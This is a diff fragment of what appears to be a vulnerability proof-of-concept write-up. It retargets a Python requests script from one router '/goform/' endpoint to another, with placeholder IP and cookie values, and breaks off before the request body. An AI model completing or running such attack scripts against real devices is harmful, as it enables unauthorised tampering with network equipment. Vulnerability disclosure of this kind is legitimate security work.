@@ -24,7 +24,7 @@ Run poc
 ```python
 import requests
 
-url = 'http://IP:port/goform/WifiWpsOOB'
+url = 'http://IP:port/goform/addWifiMacFilter'
 
 headers = {"Cookie": "password=You cookie"}
 data = {
